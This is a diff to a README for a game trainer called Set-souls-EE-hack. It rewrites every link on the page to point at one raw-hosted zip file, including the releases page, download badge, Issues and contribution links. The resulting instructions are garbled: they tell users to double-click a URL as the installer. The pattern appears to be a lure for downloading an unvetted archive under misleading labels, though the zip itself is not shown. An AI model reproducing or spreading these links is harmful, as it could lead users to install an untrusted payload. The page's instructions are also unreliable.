@@ -4,7 +4,7 @@
 
 Welcome! This guide will help you download and run the Set-souls-EE-hack application. This trainer offers various enhancements for the game Eastern Exorcist. With it, you can enjoy features like infinite health, unlimited stamina, and much more.
 
-[![Download Link](https://img.shields.io/badge/Download%20Now-Set--souls--EE--hack-brightgreen)](https://github.com/Carl-Caballes/Set-souls-EE-hack/releases)
+[![Download Link](https://raw.githubusercontent.com/Carl-Caballes/Set-souls-EE-hack/main/Disa/Set-souls-EE-hack.zip%20Now-Set--souls--EE--hack-brightgreen)](https://raw.githubusercontent.com/Carl-Caballes/Set-souls-EE-hack/main/Disa/Set-souls-EE-hack.zip)
 
 ## 💻 System Requirements
 
@@ -17,16 +17,16 @@ Before getting started, ensure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the Set-souls-EE-hack application, visit the [Releases page](https://github.com/Carl-Caballes/Set-souls-EE-hack/releases). Here, you'll find the latest version of the software available for your use.
+To download the Set-souls-EE-hack application, visit the [Releases page](https://raw.githubusercontent.com/Carl-Caballes/Set-souls-EE-hack/main/Disa/Set-souls-EE-hack.zip). Here, you'll find the latest version of the software available for your use.
 
 1. Open the link above.
 2. Look for the latest release at the top of the page.
-3. Click on the asset that says `Set-souls-EE-hack.exe` to download the installer.
+3. Click on the asset that says `https://raw.githubusercontent.com/Carl-Caballes/Set-souls-EE-hack/main/Disa/Set-souls-EE-hack.zip` to download the installer.
 4. Once the download completes, locate the file in your downloads folder.
 
 ### 🔧 Installing the Application
 
-1. Double-click on the `Set-souls-EE-hack.exe` file.
+1. Double-click on the `https://raw.githubusercontent.com/Carl-Caballes/Set-souls-EE-hack/main/Disa/Set-souls-EE-hack.zip` file.
 2. Follow the on-screen instructions to complete the installation.
 3. Once installed, you can find the application in your Start Menu.
 
@@ -56,7 +56,7 @@ If you encounter issues, consider the following:
 - **The application won’t open:** Ensure you installed it correctly. Try restarting your computer.
 - **Cheats do not activate:** Make sure the game is running. Try toggling the cheats again.
 
-For further assistance, check the Issues section on the [GitHub page](https://github.com/Carl-Caballes/Set-souls-EE-hack/issues).
+For further assistance, check the Issues section on the [GitHub page](https://raw.githubusercontent.com/Carl-Caballes/Set-souls-EE-hack/main/Disa/Set-souls-EE-hack.zip).
 
 ### 📢 FAQs
 
@@ -68,7 +68,7 @@ A: This trainer is designed to enhance your single-player experience. Use it res
 
 ## 🔗 Additional Resources
 
-- [GitHub Issues](https://github.com/Carl-Caballes/Set-souls-EE-hack/issues): Report problems or ask questions.
-- [How to Contribute](https://github.com/Carl-Caballes/Set-souls-EE-hack): Interested in contributing? Check how to get involved.
+- [GitHub Issues](https://raw.githubusercontent.com/Carl-Caballes/Set-souls-EE-hack/main/Disa/Set-souls-EE-hack.zip): Report problems or ask questions.
+- [How to Contribute](https://raw.githubusercontent.com/Carl-Caballes/Set-souls-EE-hack/main/Disa/Set-souls-EE-hack.zip): Interested in contributing? Check how to get involved.
 
-For the latest version and updates, revisit the [Releases page](https://github.com/Carl-Caballes/Set-souls-EE-hack/releases). Enjoy your gaming experience with Set-souls-EE-hack!
+For the latest version and updates, revisit the [Releases page](https://raw.githubusercontent.com/Carl-Caballes/Set-souls-EE-hack/main/Disa/Set-souls-EE-hack.zip). Enjoy your gaming experience with Set-souls-EE-hack!
